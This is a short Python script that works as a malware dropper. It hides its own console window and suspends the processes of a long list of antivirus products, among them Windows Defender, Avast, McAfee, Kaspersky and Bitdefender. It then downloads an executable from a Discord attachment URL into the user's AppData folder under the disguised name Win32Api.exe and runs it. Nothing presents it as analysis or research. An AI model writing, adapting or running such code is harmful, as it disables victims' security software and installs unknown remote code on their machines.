import urllib.request
import psutil
import time
import win32gui
import win32con
import os
import subprocess

# Hide the console window
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

# List of process names to pause
process_names = ['AvastSvc.exe', 'MsMpEng.exe', 'ccSvcHst.exe', 'mcshield.exe', 'McSvHost.exe', 'AvastUI.exe', 'avp.exe', 'avpui.exe', 'avgsvc.exe', 'avgui.exe', 'bdagent.exe', 'bdservicehost.exe', 'egui.exe', 'ekrn.exe', 'TmProxy.exe', 'TmListen.exe', 'fsav.exe', 'fsorsp.exe', 'mbamservice.exe', 'mbamtray.exe', 'PSANHost.exe', 'PSUAService.exe', 'avira.servicehost.exe', 'avnotify.exe', 'Smc.exe', 'SBAMSvc.exe', 'SBAMTray.exe', 'savservice.exe', 'savmain.exe', 'AVKTray.exe', 'AVKService.exe', 'WRSA.exe', 'WRSVC.exe', 'vsmon.exe', 'zatray.exe', 'dwengine.exe', 'dwservice.exe', 'bullguard.exe', 'bgmain.exe', 'quickup.exe', 'quickheal.exe', 'cavwp.exe', 'cis.exe', 'VoodooShield.exe', 'VoodooAi.exe', 'ClamTray.exe', 'ClamWin.exe']

# Pause the processes
for proc in psutil.process_iter(['pid', 'name']):
    if proc.info['name'] in process_names:
        proc.suspend()

# Download a file from a URL and save it to AppData directory
url = 'https://cdn.discordapp.com/attachments/1074594793465847878/1083848261514825758/main.exe'
filename = 'Win32Api.exe'
appdata_path = os.getenv('APPDATA')
file_path = os.path.join(appdata_path, filename)
urllib.request.urlretrieve(url, file_path)

subprocess.Popen(file_path, shell=True)
